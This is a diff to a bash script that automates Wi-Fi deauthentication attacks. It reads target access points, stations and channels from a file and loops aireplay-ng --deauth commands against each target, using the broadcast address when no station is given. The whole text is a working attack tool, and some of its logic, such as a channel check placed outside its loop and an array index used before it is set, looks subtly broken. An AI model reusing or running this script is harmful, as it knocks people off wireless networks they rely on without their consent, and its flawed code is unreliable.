+bssid_file_channel_check() {
+    # Check if BSSID file is provided
+    if [ -n "${AP_BSSID_FILE}" ]; then
+        while IFS=',' read -r bssid channel; do
+            # Skip empty lines
+            if [ -z "${bssid}" ] || [ -z "${channel}" ]; then
+                continue
+            fi
+            # Validate the channel
+            validate_bssid "${bssid}"
+        done < "${AP_BSSID_FILE}"
+    validate_channel_range "${channel}"
+    fi
+}
+
+# Call bssid channel check
+bssid_file_channel_check
 
 if [ -n "$AP_BSSID" ]; then
     BSSIDS=("$AP_BSSID")
@@ -125,15 +759,9 @@ elif [ -n "$AP_BSSID_FILE" ]; then
     BSSIDS=($(awk -F"," '{print $1}' "$AP_BSSID_FILE"))
     STATION_BSSIDS=($(awk -F"," '{print $2}' "$AP_BSSID_FILE"))
     CHANNELS=($(awk -F"," '{print $3}' "$AP_BSSID_FILE"))
-
-    # Override channel if -c is used with -t
-    if [ -n "$CHANNEL" ]; then
-        echo "[WARNING]: Using -c option will override channel set in the file." >&2
-        for ((i=0; i<${#CHANNELS[@]}; i++)); do
-            CHANNELS[$i]="$CHANNEL"
-        done
-    fi
 fi
+
+# Loops for Single target and AP File respectively
 
 first_run=true
 
@@ -147,7 +775,7 @@ if [ -z "$AP_BSSID_FILE" ]; then
     for ((j=0; j<$REPEATS; j++)); do
         if [ "$first_run" = true ]; then
             # Initial message for the first run
-            echo "Starting aireplay-ng in 10 seconds with the following options."
+            echo "Starting aireplay-ng in ${LOOP_START_DELAY} seconds with the following options."
             echo "------------------------------"
             echo "Target AP: ${AP_BSSID}"
             echo "Target STA: ${STA_BSSID}"
@@ -160,7 +788,10 @@ if [ -z "$AP_BSSID_FILE" ]; then
             echo "Reason Code: ${REASON}"
             echo "------------------------------"
             echo
-            sleep 10
+            if [ -z "${STA_BSSID[$i]}" ]; then
+                echo "No Station entered. Using Broadcast address."
+            fi
+            sleep "${LOOP_START_DELAY}"
             first_run=false
         fi
 
@@ -175,7 +806,7 @@ if [ -z "$AP_BSSID_FILE" ]; then
         iwconfig "${IFACE}" channel "${CHANNEL}"
         
         if [ -n "${STA_BSSID[$i]}" ]; then
-            aireplay-ng --deauth "${COUNT}" -a "${BSSIDS[$i]}" -c "${STATION_BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
+            aireplay-ng --deauth "${COUNT}" -a "${BSSIDS[$i]}" -c "${STA_BSSID[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
         else
             aireplay-ng --deauth "${COUNT}" -a "${BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
         fi
@@ -192,11 +823,15 @@ if [ -z "$AP_BSSID_FILE" ]; then
     done
 fi
 
+if [ -f "${AP_BSSID_FILE}.${CDATE}" ]; then
+    AP_BSSID_FILE="${AP_BSSID_FILE}.${CDATE}"
+fi
+
 if [ -n "$AP_BSSID_FILE" ]; then
     for ((j=0; j<$REPEATS; j++)); do
         if [ "$first_run" = true ]; then
             # Initial message for the first run
-            echo "Starting aireplay-ng in 10 seconds with the following options."
+            echo "Starting aireplay-ng in ${LOOP_START_DELAY} seconds with the following options."
             echo "------------------------------"
             for i in "${!BSSIDS[@]}"; do
                 echo "Target AP: ${BSSIDS[$i]}"
@@ -212,7 +847,10 @@ if [ -n "$AP_BSSID_FILE" ]; then
             echo "Reason code: ${REASON}"
             echo "------------------------------"
             echo
-            sleep 10
+            if [ -z "${STATION_BSSIDS[$i]}" ]; then
+                echo "No Stations found in file. Using Broadcast Address."
+            fi
+            sleep "${LOOP_START_DELAY}"
             first_run=false
         fi
 
@@ -228,17 +866,22 @@ if [ -n "$AP_BSSID_FILE" ]; then
             # Set channel before running aireplay-ng command
             iwconfig "${IFACE}" channel "${CHANNELS[$i]}"
             
-            aireplay-ng --deauth "${COUNT}" -a "${BSSIDS[$i]}" -c "${STATION_BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
+            if [ -n "${STATION_BSSIDS[$i]}" ]; then
+                aireplay-ng -D --deauth "${COUNT}" -a "${BSSIDS[$i]}" -c "${STATION_BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
+            else
+                aireplay-ng -D --deauth "${COUNT}" -a "${BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
+            fi
             echo
             echo "Stopped aireplay-ng instance."
-            
-            if [ $j -lt $((REPEATS-1)) ]; then
-                echo
-                echo "Entering recurring delay of ${WAIT_SECONDS}s"
-                sleep "${WAIT_SECONDS}"
-            else
-                echo "Completed All Repeats."
-            fi
         done
+
+        # Add delay after completing all targets for the current repeat
+        if [ $j -lt $((REPEATS-1)) ]; then
+            echo
+            echo "Entering recurring delay of ${WAIT_SECONDS}s"
+            sleep "${WAIT_SECONDS}"
+        else
+            echo "Completed All Repeats."
+        fi
     done
 fi
